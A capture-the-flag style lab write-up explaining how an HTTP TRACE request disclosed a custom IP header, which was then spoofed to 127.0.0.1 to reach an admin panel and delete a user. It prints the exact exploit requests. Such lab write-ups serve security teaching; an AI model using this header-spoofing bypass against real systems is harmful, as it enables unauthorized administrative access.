# Authentication Bypass via Information Disclosure

**Difficulty:** Apprentice

**Category:** Information Disclosure / Authentication Bypass

**Status:** Solved ✅



## Overview



This lab demonstrates how **information disclosure can lead to an authentication/access control bypass**.


The application has an admin interface that is restricted based on the client's IP address. The front-end adds a custom HTTP header 
containing the client's IP, but the name of this header is not known initially.



By using the HTTP `TRACE` method, we can reveal the custom header:



```http

X-Custom-IP-Authorization

```



We can then manipulate its value and set it to:



```http
X-Custom-IP-Authorization: 127.0.0.1

```



The backend therefore treats the request as if it originated from localhost, allowing us to access the admin interface and delete the user 
`carlos`.



---


## 1. Login



The provided credentials are:


```text

Username: wiener

Password: peter

```



After logging in, we tried to access:



```text

/admin

```




The request was denied because the application performs an IP-based access check.



---



## 2. Discovering the Custom Header



We sent a `TRACE` request to `/admin`:



```http

TRACE /admin HTTP/2

Host: 0a9b00fb04b9b28781fa435800860010.web-security-academy.net

Cookie: session=YOUR_SESSION

```


The response reflected the request and revealed an additional header:



```http

X-Custom-IP-Authorization: 156.195.5.91

```



This disclosed the name of the custom header used by the application to determine the client's IP.



---



## 3. Why TRACE Worked


The `TRACE` method can reflect the HTTP request back to the client.



In this lab, the request passes through front-end infrastructure that adds the following header:




```http

X-Custom-IP-Authorization: 156.195.5.91

```



The `TRACE` response exposed this header, allowing us to discover an internal security mechanism that was not visible in the original 
request.



This is the **information disclosure** component of the vulnerability.



---



## 4. Bypassing the IP Check




The application trusts requests that appear to originate from localhost.



Therefore, after discovering the header name, we changed its value to:



```http

X-Custom-IP-Authorization: 127.0.0.1

```



`127.0.0.1` is the IPv4 loopback address and refers to the local machine.



The backend therefore interpreted the request as coming from localhost.



---



## 5. Exploit Request



We manually added the header in Burp Repeater:



```http

GET /admin HTTP/2

Host: 0a9b00fb04b9b28781fa435800860010.web-security-academy.net

Cookie: session=YOUR_SESSION

X-Custom-IP-Authorization: 127.0.0.1


```



After sending the request, the admin interface became accessible.



---



## 6. Match and Replace Attempt



We initially tried to automate the modification using Burp Suite's **Match and Replace**:



```text

Type:

Request header



Match:

X-Custom-IP-Authorization: 156.195.5.91



Replace:

X-Custom-IP-Authorization: 127.0.0.1

```



However, the request still returned the access-denied message.



Adding the header manually in Repeater worked:



```http

X-Custom-IP-Authorization: 127.0.0.1
```



Therefore, the issue was with the Match and Replace configuration/application, not with the exploit itself.



---



## 7. Final Step



Once we accessed:



```text

/admin

```



we used the administration functionality to delete:



```text
carlos

```



The lab was successfully solved.



---



## Attack Chain



```text

Login as wiener

        ↓

Request /admin
        ↓

Access denied

        ↓
Send TRACE /admin

        ↓

Discover X-Custom-IP-Authorization

        ↓

Set the header to 127.0.0.1

        ↓

Backend trusts the request as local

        ↓

Authentication/access control bypass

        ↓

Access /admin

        ↓

Delete carlos

        ↓
Lab solved ✅

```



## Key Takeaway



The important lesson is that **information disclosure can expose security mechanisms that were intended to be trusted internally**.



The vulnerability chain is:




```text

Information Disclosure

        ↓
Discover trusted security header



        ↓


Manipulate the header

        ↓

Bypass access control

```



A custom header should not be blindly trusted for security decisions unless the application can guarantee that untrusted clients cannot 
directly supply or modify it.

